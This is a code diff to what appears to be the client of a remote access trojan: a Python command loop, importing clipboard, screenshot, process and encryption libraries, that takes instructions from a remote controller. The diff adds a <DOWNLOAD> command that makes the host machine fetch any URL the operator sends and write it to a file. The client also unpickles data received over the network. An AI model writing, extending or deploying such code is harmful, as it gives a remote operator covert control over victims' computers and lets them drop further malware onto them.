@@ -10,6 +10,7 @@ import time
 import psutil
 import pyperclip
 import pyscreenshot
+import requests
 from cryptography.fernet import Fernet
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes, serialization
@@ -209,7 +210,20 @@ class Client(object):
                 filedata = pickle.loads(packed_data)
                 with open(filedata['filename'], 'wb') as f:
                     f.write(filedata['data'])
-                self.send(b'File Transfer Successful')
+                self.send(b'File Transfer Successful\n')
+                continue
+
+            if data == b'<DOWNLOAD>':
+                self.send(b'<READY>')
+                unpacked_data = pickle.loads(self.receive())
+                try:
+                    r = requests.get(unpacked_data['url'])
+                    with open(unpacked_data['filename'], 'wb') as f:
+                        f.write(r.content)
+                except Exception as e:
+                    self.send('Error downloading file: {}\n'.format(str(e)).encode())
+                    continue
+                self.send(b'Download Successful\n')
                 continue
 
             if data == b'<COPY>':
